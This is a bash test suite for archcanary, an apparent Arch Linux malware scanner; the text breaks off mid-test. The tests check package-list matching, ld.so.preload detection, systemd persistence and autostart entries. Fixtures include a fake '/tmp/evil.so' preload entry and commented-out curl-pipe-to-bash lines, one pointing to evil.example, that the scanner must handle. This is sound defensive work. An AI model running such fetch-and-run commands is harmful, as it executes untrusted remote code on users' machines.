#!/usr/bin/env bash
#
# Matching test runner for archcanary
# Tests that package matching is exact (no prefix/suffix false positives)
# and that list parsing handles edge cases correctly.
#
# Usage:
#   ./tests/run_matching_tests.sh          # run all tests
#   ./tests/run_matching_tests.sh -v       # verbose output
#

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_DIR="$(dirname "$SCRIPT_DIR")"
VERBOSE=false
FAIL_COUNT=0
PASS_COUNT=0

[[ "${1:-}" == "-v" ]] && VERBOSE=true

msg()   { echo >&2 "  $*"; }
pass()  { echo >&2 "  PASS: $1"; PASS_COUNT=$((PASS_COUNT + 1)); }
fail()  { echo >&2 "  FAIL: $1"; FAIL_COUNT=$((FAIL_COUNT + 1)); }

# ---------------------------------------------------------------------------
# Helper: load a package list file the same way archcanary.sh does
# Returns array via nameref
# ---------------------------------------------------------------------------
load_list() {
    local file=$1
    local -n arr=$2
    arr=()
    while IFS= read -r line; do
        [[ "$line" =~ ^#.*$ || -z "$line" ]] && continue
        arr+=("$line")
    done < "$file"
}

# ---------------------------------------------------------------------------
# Helper: simulate check_current logig — filter installed list against
#          infected list (exact match only)
# ---------------------------------------------------------------------------
filter_installed() {
    local _fn="$1" _fl="$2" _fr="$3"
    local _fa=() _fb=()
    eval '_fa=("${'"$_fn"'[@]}")'
    eval '_fb=("${'"$_fl"'[@]}")'
    local _fc=()
    local _p _q
    for _p in "${_fa[@]}"; do
        local _m=""
        for _q in "${_fb[@]}"; do
            if [[ "$_p" == "$_q" ]]; then
                _m="$_q"
                break
            fi
        done
        if [[ -n "$_m" ]]; then
            _fc+=("$_p")
        fi
    done
    eval "$_fr=(\"\${_fc[@]}\")"
}

# ---------------------------------------------------------------------------
# Test 1: suffix_ambiguity — jd-gui-bin should NOT match jd-gui
# ---------------------------------------------------------------------------
test_suffix_ambiguity() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/suffix_ambiguity.txt" infected

    # Simulate installed packages including jd-gui (infected) and jd-gui-bin (not)
    local installed=("jd-gui" "jd-gui-bin" "alienfx" "alienfx-lite" "alock" "alock-git" "nss" "git")
    local matched=()
    filter_installed installed infected matched

    local expected=("jd-gui" "alienfx" "alock" "nss" "git")

    if [[ "${#matched[@]}" -eq "${#expected[@]}" ]]; then
        local all_match=true
        local i
        for i in "${!expected[@]}"; do
            [[ "${matched[$i]}" == "${expected[$i]}" ]] || all_match=false
        done
        if $all_match; then
            pass "suffix_ambiguity: exact match only (no prefix false positives)"
        else
            fail "suffix_ambiguity: matched ${matched[*]}, expected ${expected[*]}"
        fi
    else
        fail "suffix_ambiguity: got ${#matched[@]} matches, expected ${#expected[@]} (${matched[*]:-none})"
    fi
}

# ---------------------------------------------------------------------------
# Test 2: substring — short names like 'git' should not match longer names
# ---------------------------------------------------------------------------
test_substring() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/substring.txt" infected

    local installed=("git" "git-credential-manager-core-bin" "nss" "python-nss" "cuda" "cuda-12.8" "python" "python3.11")
    local matched=()
    filter_installed installed infected matched

    local expected=("git" "nss" "cuda" "python")
    if [[ "${#matched[@]}" -eq "${#expected[@]}" ]]; then
        local all_match=true
        local i
        for i in "${!expected[@]}"; do
            [[ "${matched[$i]}" == "${expected[$i]}" ]] || all_match=false
        done
        if $all_match; then
            pass "substring: git/nss/python/cuda match exactly, not suffixed variants"
        else
            fail "substring: matched ${matched[*]}, expected ${expected[*]}"
        fi
    else
        fail "substring: got ${#matched[@]} matches, expected ${#expected[@]} (${matched[*]:-none})"
    fi
}

# ---------------------------------------------------------------------------
# Test 3: empty list — should match nothing
# ---------------------------------------------------------------------------
test_empty_list() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/empty.txt" infected

    local installed=("alvr" "guiscrcpy" "jd-gui" "git")
    local matched=()
    filter_installed installed infected matched

    if [[ ${#matched[@]} -eq 0 ]]; then
        pass "empty_list: no matches from empty infected list"
    else
        fail "empty_list: got ${#matched[@]} matches from empty list"
    fi
}

# ---------------------------------------------------------------------------
# Test 4: comments parsing — comment lines and blanks are ignored
# ---------------------------------------------------------------------------
test_comments_parsing() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/comments.txt" infected

    local expected=("alvr" "guiscrcpy" "netmon-git")
    if [[ "${#infected[@]}" -eq "${#expected[@]}" ]]; then
        local all_match=true
        local i
        for i in "${!expected[@]}"; do
            [[ "${infected[$i]}" == "${expected[$i]}" ]] || all_match=false
        done
        if $all_match; then
            pass "comments_parsing: comments and blanks correctly ignored"
        else
            fail "comments_parsing: parsed ${infected[*]}, expected ${expected[*]}"
        fi
    else
        fail "comments_parsing: got ${#infected[@]} entries, expected ${#expected[@]}"
    fi
}

# ---------------------------------------------------------------------------
# Test 5: special characters — dots, plus, hyphens in package names
# ---------------------------------------------------------------------------
test_specials() {
    local infected=()
    load_list "$SCRIPT_DIR/fake_package_lists/specials.txt" infected

    local expected=("python3.11" "gcc-libs" "cuda-12.8" "ruby3.3+dev" "dot_underscore" "alac-git")
    if [[ "${#infected[@]}" -eq "${#expected[@]}" ]]; then
        local all_match=true
        local i
        for i in "${!expected[@]}"; do
            [[ "${infected[$i]}" == "${expected[$i]}" ]] || all_match=false
        done
        if $all_match; then
            pass "specials: dots/plus/hyphens parsed correctly"
        else
            fail "specials: parsed ${infected[*]}, expected ${expected[*]}"
        fi
    else
        fail "specials: got ${#infected[@]} entries, expected ${#expected[@]}"
    fi
}

# ---------------------------------------------------------------------------
# Test 6: --package-list CLI flag integration
# ---------------------------------------------------------------------------
test_cli_flag() {
    local log_file
    log_file=$(mktemp)

    # Run via env var (existing path)
    # Pin chaos-rat/russian-spam/aur-audit lists to an empty fixture so the
    # count isn't inflated by real lists cached under this machine's
    # ~/.config/archcanary (aur-audit has no CLI override flag by design —
    # env var is the only pin point, same as PACKAGE_LIST_FILE below).
    local result=0
    PACKAGE_LIST_FILE="$SCRIPT_DIR/fake_package_lists/simple.txt" \
    AUR_AUDIT_BLACK_LIST="$SCRIPT_DIR/fake_package_lists/empty.txt" \
    AUR_AUDIT_RED_LIST="$SCRIPT_DIR/fake_package_lists/empty.txt" \
    "$REPO_DIR/archcanary.sh" \
        --chaos-rat-list="$SCRIPT_DIR/fake_package_lists/empty.txt" \
        --russian-spam-list="$SCRIPT_DIR/fake_package_lists/empty.txt" \
        --log-file="$log_file" >/dev/null 2>&1 || true
    grep -q "Packages checked: 10" "$log_file" || result=$?

    if [[ $result -eq 0 ]]; then
        pass "cli_flag: PACKAGE_LIST_FILE env loads 10 packages"
    else
        # Try with direct --package-list flag
        result=0
        AUR_AUDIT_BLACK_LIST="$SCRIPT_DIR/fake_package_lists/empty.txt" \
        AUR_AUDIT_RED_LIST="$SCRIPT_DIR/fake_package_lists/empty.txt" \
        "$REPO_DIR/archcanary.sh" \
            --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
            --chaos-rat-list="$SCRIPT_DIR/fake_package_lists/empty.txt" \
            --russian-spam-list="$SCRIPT_DIR/fake_package_lists/empty.txt" \
            --log-file="$log_file" >/dev/null 2>&1 || true
        grep -q "Packages checked: 10" "$log_file" || result=$?
        if [[ $result -eq 0 ]]; then
            pass "cli_flag: --package-list=PATH loads 10 packages"
        else
            fail "cli_flag: could not verify package count"
        fi
    fi

    rm -f "$log_file"
}

# ---------------------------------------------------------------------------
# Test 7: --malicious-npm-list CLI flag integration
# ---------------------------------------------------------------------------
test_npm_cli_flag() {
    local log_file
    log_file=$(mktemp)

    "$REPO_DIR/archcanary.sh" \
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt" \
        --log-file="$log_file" >/dev/null 2>&1 || true

    if grep -q "malicious_npm.txt" "$log_file"; then
        pass "npm_cli_flag: --malicious-npm-list=PATH accepted"
    elif grep -q "Packages checked:" "$log_file"; then
        pass "npm_cli_flag: script ran successfully with custom npm list"
    else
        fail "npm_cli_flag: script failed with custom npm list"
    fi

    rm -f "$log_file"
}

# ---------------------------------------------------------------------------
# Test 8: verify actual repo package_list.txt is parseable (no corrupt lines)
# ---------------------------------------------------------------------------
test_actual_list_integrity() {
    local infected=()
    load_list "$REPO_DIR/lists/package_list.txt" infected

    if [[ ${#infected[@]} -gt 500 ]]; then
        pass "actual_list: parsed ${#infected[@]} packages from package_list.txt"
    else
        fail "actual_list: only got ${#infected[@]} packages (expected >500)"
    fi
}

# ---------------------------------------------------------------------------
# Test 9: check_ldso — detects non-empty /etc/ld.so.preload
# ---------------------------------------------------------------------------
test_check_ldso() {
    local tmpdir preload_file conf_dir
    tmpdir=$(mktemp -d)
    preload_file="$tmpdir/ld.so.preload"
    conf_dir="$tmpdir/ld.so.conf.d"
    mkdir -p "$conf_dir"

    local out rc=0

    # Sub-test A: absent/empty preload, empty conf.d → clean
    rc=0
    out=$(LDSO_PRELOAD_FILE="$preload_file" LDSO_CONF_DIR="$conf_dir" \
        "$REPO_DIR/archcanary.sh" \
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt" \
        --check-ldso --no-notify 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_ldso: absent preload → clean"
    else
        fail "check_ldso: absent preload → expected clean, got: $out"
    fi

    # Sub-test B: non-empty preload → WARNING (exit 2)
    echo "/tmp/evil.so" > "$preload_file"
    rc=0
    out=$(LDSO_PRELOAD_FILE="$preload_file" LDSO_CONF_DIR="$conf_dir" \
        "$REPO_DIR/archcanary.sh" \
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt" \
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt" \
        --check-ldso --no-notify 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING"* && "$out" == *"evil.so"* ]]; then
        pass "check_ldso: non-empty preload → WARNING (exit 2) with library listed"
    else
        fail "check_ldso: non-empty preload → expected WARNING+exit2, got rc=$rc"
    fi

    rm -rf "$tmpdir"
}

# ---------------------------------------------------------------------------
# Test 10: check_systemd hardened — drop-ins, timers, wider Restart= match
# ---------------------------------------------------------------------------
test_check_systemd_hardened() {
    local fixture_dir="$SCRIPT_DIR/systemd"
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-systemd --no-notify
    )

    local out rc=0

    # Sub-test A: drop-in override with Restart=on-failure → WARNING
    out=$(SYSTEMD_SCAN_DIRS="$fixture_dir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING"* && "$out" == *"on-failure"* ]]; then
        pass "check_systemd: drop-in Restart=on-failure → WARNING (exit 2)"
    else
        fail "check_systemd: drop-in Restart=on-failure → expected WARNING+exit2, got rc=$rc"
    fi

    # Sub-test B: timer with OnBootSec + Persistent=true → WARNING
    if [[ "$out" == *"timer"* || "$out" == *"Persistent"* ]]; then
        pass "check_systemd: OnBootSec+Persistent timer → WARNING"
    else
        fail "check_systemd: timer not detected — got: $out"
    fi

    # Sub-test B2: WARNING output is followed by the allowlist remediation hint
    if [[ "$out" == *"pkexec /usr/lib/archcanary/root-helper --allowlist-add=systemd:"* ]]; then
        pass "check_systemd: allowlist hint present in WARNING output"
    else
        fail "check_systemd: allowlist hint missing from WARNING output, got: $out"
    fi

    # Sub-test C: empty dir → clean
    local tmpdir
    tmpdir=$(mktemp -d)
    rc=0
    out=$(SYSTEMD_SCAN_DIRS="$tmpdir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_systemd: empty scan dir → clean"
    else
        fail "check_systemd: empty dir → expected clean, got: $out"
    fi
    rm -rf "$tmpdir"

    # Sub-test D: allowlisted unit names → INFO, no WARNING, exit 0 (clean)
    local allow_file
    allow_file=$(mktemp)
    printf 'fake-persist.service\nfake-persist.timer\n' > "$allow_file"
    rc=0
    out=$(SYSTEMD_SCAN_DIRS="$fixture_dir" SYSTEMD_ALLOWLIST_FILE="$allow_file" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"INFO: systemd unit allowlisted"* \
          && "$out" == *"INFO: systemd timer allowlisted"* && "$out" != *"WARNING"* ]]; then
        pass "check_systemd: allowlisted unit/timer → INFO only, exit 0 (clean)"
    else
        fail "check_systemd: allowlisted unit/timer → expected INFO+exit0, got rc=$rc, out: $out"
    fi
    rm -f "$allow_file"
}

# ---------------------------------------------------------------------------
# Test 11: check_autostart — suspicious .desktop and shell RC detection
# ---------------------------------------------------------------------------
test_check_autostart() {
    local fake_home="$SCRIPT_DIR/fake_home"
    local base_args=(
        --package-list="$SCRIPT_DIR/fake_package_lists/simple.txt"
        --malicious-npm-list="$SCRIPT_DIR/fake_npm_lists/malicious_npm.txt"
        --check-autostart --no-notify
    )
    local out rc=0

    # Sub-test A: fixture home with evil.desktop + malicious .bashrc → WARNING
    rc=0
    out=$(AUTOSTART_HOME="$fake_home" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING"* ]]; then
        pass "check_autostart: evil.desktop + malicious .bashrc → WARNING (exit 2)"
    else
        fail "check_autostart: expected WARNING+exit2, got rc=$rc"
    fi

    # Sub-test B: evil.desktop is flagged, clean.desktop is not
    if [[ "$out" == *"evil.desktop"* && "$out" != *"clean.desktop"* ]]; then
        pass "check_autostart: evil.desktop flagged, clean.desktop not flagged"
    else
        fail "check_autostart: desktop filtering wrong — out: $out"
    fi

    # Sub-test C: .bashrc curl|bash pattern detected
    if [[ "$out" == *".bashrc"* ]]; then
        pass "check_autostart: curl|bash in .bashrc detected"
    else
        fail "check_autostart: .bashrc pattern not detected — out: $out"
    fi

    # Sub-test C2: shell-RC WARNING includes the "remove the line" hint
    if [[ "$out" == *"If you don't recognize this, remove the line from"* ]]; then
        pass "check_autostart: shell-RC WARNING includes remediation hint"
    else
        fail "check_autostart: shell-RC remediation hint missing — out: $out"
    fi

    # Sub-test D: clean home dir → clean
    local tmpdir
    tmpdir=$(mktemp -d)
    mkdir -p "$tmpdir/.config/autostart"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: empty home → clean"
    else
        fail "check_autostart: empty home → expected clean, got: $out"
    fi
    rm -rf "$tmpdir"

    # Sub-test E: bare Exec= name unresolvable via $PATH but found in a
    # non-PATH libdir (simulates e.g. /usr/lib/zeitgeist/zeitgeist-datahub) → clean
    local tmpdir2 libdir
    tmpdir2=$(mktemp -d)
    libdir=$(mktemp -d)
    mkdir -p "$tmpdir2/.config/autostart" "$libdir/fakepkg"
    cat > "$tmpdir2/.config/autostart/fakepkg.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=FakePkg
Exec=fakepkg-helper
DESK
    printf '#!/bin/sh\n' > "$libdir/fakepkg/fakepkg-helper"
    chmod +x "$libdir/fakepkg/fakepkg-helper"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir2" AUTOSTART_LIBDIRS="$libdir" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: bare Exec= resolved via non-PATH libdir fallback → clean"
    else
        fail "check_autostart: non-PATH fallback resolution failed, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir2" "$libdir"

    # Sub-test F: bare Exec= name unresolvable anywhere, not allowlisted → WARNING
    local tmpdir3
    tmpdir3=$(mktemp -d)
    mkdir -p "$tmpdir3/.config/autostart"
    cat > "$tmpdir3/.config/autostart/unresolved.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=Unresolved
Exec=totally-unresolvable-binary
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir3" AUTOSTART_LIBDIRS="/nonexistent-dir-xyz" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: suspicious autostart entry"* ]]; then
        pass "check_autostart: unresolved bare Exec=, not allowlisted → WARNING"
    else
        fail "check_autostart: unresolved bare Exec= regression, rc=$rc, out: $out"
    fi

    # Sub-test G: same unresolvable binary, but allowlisted → INFO only, exit 0
    local allow_file2
    allow_file2=$(mktemp)
    printf 'totally-unresolvable-binary\n' > "$allow_file2"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir3" AUTOSTART_LIBDIRS="/nonexistent-dir-xyz" \
        AUTOSTART_ALLOWLIST_FILE="$allow_file2" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"INFO: autostart entry allowlisted"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: allowlisted unresolved Exec= → INFO only, exit 0 (clean)"
    else
        fail "check_autostart: allowlisted unresolved Exec= → expected INFO+exit0, got rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir3"
    rm -f "$allow_file2"

    # Sub-test H: glob metacharacters in Exec= must not act as a find(1)
    # wildcard — a literal "*" must not match an unrelated executable in the
    # libdir and silently bypass the check (regression test for the
    # glob-injection fix: find -name treats its argument as a pattern unless
    # escaped, so an unescaped "*" would match the first executable found).
    local tmpdir4 libdir2
    tmpdir4=$(mktemp -d)
    libdir2=$(mktemp -d)
    mkdir -p "$tmpdir4/.config/autostart" "$libdir2/somepkg"
    printf '#!/bin/sh\n' > "$libdir2/somepkg/some-real-helper"
    chmod +x "$libdir2/somepkg/some-real-helper"
    cat > "$tmpdir4/.config/autostart/glob.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=GlobAttempt
Exec=*
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir4" AUTOSTART_LIBDIRS="$libdir2" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: suspicious autostart entry"* ]]; then
        pass "check_autostart: glob metacharacter Exec=* does not bypass via find wildcard match"
    else
        fail "check_autostart: glob-injection regression — Exec=* should still WARNING, got rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir4" "$libdir2"

    # Sub-test I: Hidden=true entry with an unresolvable Exec= must NOT warn —
    # per the XDG spec this is how DE autostart managers (Mabox included)
    # disable an entry without deleting the file; it can never execute, so
    # there is nothing to flag regardless of whether Exec= resolves.
    local tmpdir5
    tmpdir5=$(mktemp -d)
    mkdir -p "$tmpdir5/.config/autostart"
    cat > "$tmpdir5/.config/autostart/hidden.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=Hidden
Exec=totally-unresolvable-binary
Hidden=true
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir5" AUTOSTART_LIBDIRS="/nonexistent-dir-xyz" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: Hidden=true entry skipped even with unresolvable Exec="
    else
        fail "check_autostart: Hidden=true entry should be skipped, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir5"

    # Sub-test J: X-GNOME-Autostart-enabled=false behaves the same as Hidden=true
    local tmpdir6
    tmpdir6=$(mktemp -d)
    mkdir -p "$tmpdir6/.config/autostart"
    cat > "$tmpdir6/.config/autostart/gnome-disabled.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=GnomeDisabled
Exec=totally-unresolvable-binary
X-GNOME-Autostart-enabled=false
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir6" AUTOSTART_LIBDIRS="/nonexistent-dir-xyz" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: X-GNOME-Autostart-enabled=false entry skipped"
    else
        fail "check_autostart: X-GNOME-Autostart-enabled=false should be skipped, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir6"

    # Sub-test K: user systemd service with an unowned ExecStart binary, not
    # allowlisted → WARNING (regression guard — this branch had zero test
    # coverage before the allowlist fix below was added). Pins
    # AUTOSTART_ALLOWLIST_FILE to a nonexistent path so this can't spuriously
    # pass/fail depending on whatever the real /etc/archcanary allowlist
    # happens to contain on the machine running the suite (e.g. after
    # running --allowlist-add=autostart against this exact fixture path).
    local tmpdir7
    tmpdir7=$(mktemp -d)
    mkdir -p "$tmpdir7/.config/systemd/user"
    cat > "$tmpdir7/.config/systemd/user/eos-update-notifier.service" << 'SVC'
[Unit]
Description=fake unowned service

[Service]
Type=oneshot
ExecStart=/opt/fake-unowned-pkg/eos-update-notifier
SVC
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir7" AUTOSTART_ALLOWLIST_FILE="/nonexistent-allowlist-xyz" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: user service with unowned ExecStart binary"* ]]; then
        pass "check_autostart: user service with unowned ExecStart, not allowlisted → WARNING"
    else
        fail "check_autostart: user service unowned-ExecStart regression, rc=$rc, out: $out"
    fi

    # Sub-test L: same unowned ExecStart binary, allowlisted by its exact
    # full path → INFO only, exit 0 (the eos-update-notifier case: the
    # package ships its user unit via /etc/skel, so the copy materialized
    # into ~/.config/systemd/user/ at account creation is never itself
    # pacman-tracked even though the binary path normally would be). Uses
    # the full ExecStart path, not just the basename — matching on basename
    # alone would let an unrelated binary sharing that name anywhere on disk
    # slip through, which is exactly what the full-path match here guards
    # against (see the sibling failure-mode note on the WARNING case above).
    local allow_file3
    allow_file3=$(mktemp)
    printf '/opt/fake-unowned-pkg/eos-update-notifier\n' > "$allow_file3"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir7" AUTOSTART_ALLOWLIST_FILE="$allow_file3" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 0 && "$out" == *"INFO: user service allowlisted"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: user service unowned ExecStart, allowlisted → INFO only, exit 0"
    else
        fail "check_autostart: allowlisted user service ExecStart → expected INFO+exit0, got rc=$rc, out: $out"
    fi

    # Sub-test M: allowlisting only the basename (not the full path) must NOT
    # suppress the warning — regression guard for the basename-match bypass
    # found in code review (an attacker-placed binary anywhere on disk
    # sharing a legitimately-allowlisted basename must still be flagged).
    local allow_file4
    allow_file4=$(mktemp)
    printf 'eos-update-notifier\n' > "$allow_file4"
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir7" AUTOSTART_ALLOWLIST_FILE="$allow_file4" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"WARNING: user service with unowned ExecStart binary"* ]]; then
        pass "check_autostart: basename-only allowlist entry does not suppress full-path finding"
    else
        fail "check_autostart: basename-only allowlist entry should NOT match, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir7"
    rm -f "$allow_file3" "$allow_file4"

    # Sub-test N: absolute .desktop Exec= path under $HOME/bin or
    # $HOME/.local/bin must NOT be flagged — regression guard for a real
    # false positive (Conky's LXQt-generated autostart entry pointing at a
    # personal launcher script in ~/bin).
    local tmpdir8
    tmpdir8=$(mktemp -d)
    mkdir -p "$tmpdir8/.config/autostart" "$tmpdir8/bin" "$tmpdir8/.local/bin"
    cat > "$tmpdir8/.config/autostart/conky.desktop" << DESK
[Desktop Entry]
Type=Application
Name=Conky
Exec=$tmpdir8/bin/conky-start.sh
DESK
    cat > "$tmpdir8/.config/autostart/localbin.desktop" << DESK
[Desktop Entry]
Type=Application
Name=LocalBinThing
Exec=$tmpdir8/.local/bin/something.sh
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir8" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: absolute Exec= under \$HOME/bin or \$HOME/.local/bin not flagged"
    else
        fail "check_autostart: \$HOME/bin false positive regression, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir8"

    # Sub-test O: a fully commented-out line matching a dangerous shell-RC
    # pattern must NOT be flagged — regression guard for a real false
    # positive (a user kept an old, disabled alias as a commented-out note
    # referencing the original AUR incident).
    local tmpdir9
    tmpdir9=$(mktemp -d)
    cat > "$tmpdir9/.bashrc" << 'RC'
echo hello
# alias ckaur='curl -s https://cscs.pastes.sh/raw/aurvulntest20260611.sh | bash'  #<----[ check for the new aur vulnerability (06-2026)
    # indented comment: curl -s https://evil.example | bash
RC
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir9" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: commented-out shell RC pattern not flagged"
    else
        fail "check_autostart: commented-out RC line false positive regression, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir9"

    # Sub-test P: summary table shows "REVIEW" (not "INFECTED") for a genuine
    # autostart finding, and the WARNING text includes the allowlist
    # self-service hint — reported live by two separate users whose
    # legitimate autostart entries produced an alarming "INFECTED" verdict
    # with no indication a fix (allowlisting) even existed.
    local tmpdir10
    tmpdir10=$(mktemp -d)
    mkdir -p "$tmpdir10/.config/autostart"
    cat > "$tmpdir10/.config/autostart/someapp.desktop" << DESK
[Desktop Entry]
Type=Application
Name=SomeApp
Exec=$tmpdir10/Applications/SomeApp.AppImage
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir10" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" --color=never 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"REVIEW"* && "$out" != *"INFECTED"* && \
          "$out" == *"--allowlist-add=autostart:"* ]]; then
        pass "check_autostart: summary shows REVIEW + allowlist hint present"
    else
        fail "check_autostart: expected REVIEW wording + allowlist hint, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir10"

    # Sub-test Q: a Flatpak app resolved via $PATH (flatpak-bindir.sh puts
    # Flatpak's export dir on PATH on any Flatpak-enabled system) must NOT
    # be flagged — regression guard for a real false positive (Gearlever,
    # MEGAsync, Eloquent all reported live as "suspicious").
    local tmpdir11
    tmpdir11=$(mktemp -d)
    mkdir -p "$tmpdir11/.config/autostart" "$tmpdir11/.local/share/flatpak/exports/bin"
    cat > "$tmpdir11/.config/autostart/flatpakapp.desktop" << 'DESK'
[Desktop Entry]
Type=Application
Name=FlatpakApp
Exec=re.sonny.Eloquent
DESK
    ln -s /bin/true "$tmpdir11/.local/share/flatpak/exports/bin/re.sonny.Eloquent"
    rc=0
    out=$(PATH="$tmpdir11/.local/share/flatpak/exports/bin:$PATH" AUTOSTART_HOME="$tmpdir11" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: Flatpak app resolved via \$PATH not flagged"
    else
        fail "check_autostart: Flatpak-on-PATH false positive regression, rc=$rc, out: $out"
    fi

    # Sub-test R: same Flatpak app, but NOT on $PATH (e.g. a minimal/cron-like
    # scan environment) — must still resolve via the non-PATH libdir search
    # now that Flatpak's export dirs are searched by default.
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir11" \
        AUTOSTART_LIBDIRS="/usr/lib:/usr/libexec:/var/lib/flatpak/exports/bin:$tmpdir11/.local/share/flatpak/exports/bin" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" 2>&1) || rc=$?
    if [[ "$out" == *"Clean"* && "$out" != *"WARNING"* ]]; then
        pass "check_autostart: Flatpak app resolved via non-PATH libdir search not flagged"
    else
        fail "check_autostart: Flatpak libdir-fallback regression, rc=$rc, out: $out"
    fi
    rm -rf "$tmpdir11"

    # Sub-test S: a quoted Exec= value (e.g. pCloud's installer wraps its
    # launcher path in literal double quotes even with no spaces to quote)
    # must have the quotes stripped before classification/display/allowlist
    # matching — otherwise it's misclassified as an unresolvable bare name
    # (starts with '"' not '/'), and the value is un-allowlistable: a real
    # shell strips the quotes when the user types the suggested
    # --allowlist-add command, so the stored value could never match the
    # raw, still-quoted one used for comparison. Reported live.
    local tmpdir12
    tmpdir12=$(mktemp -d)
    mkdir -p "$tmpdir12/.config/autostart"
    cat > "$tmpdir12/.config/autostart/pcloud.desktop" << DESK
[Desktop Entry]
Type=Application
Name=pCloud
Exec="$tmpdir12/pcloud-launcher.sh"
DESK
    rc=0
    out=$(AUTOSTART_HOME="$tmpdir12" \
        "$REPO_DIR/archcanary.sh" "${base_args[@]}" --color=never 2>&1) || rc=$?
    if [[ $rc -eq 2 && "$out" == *"Exec=$tmpdir12/pcloud-launcher.sh (outside"* && \
          "$out" == *"--allowlist-add=autostart:$tmpdir12/pcloud-launcher.sh"* ]]; then
        pass "check_autostart: quoted Exec= value has quotes stripped in WARNING/hint text"
    else
        fail "check_autostart: quoted Exec= should show unquoted value, rc=$rc, out: $out"
    fi

    local allow_file5
    allow_file5=$(mktemp)
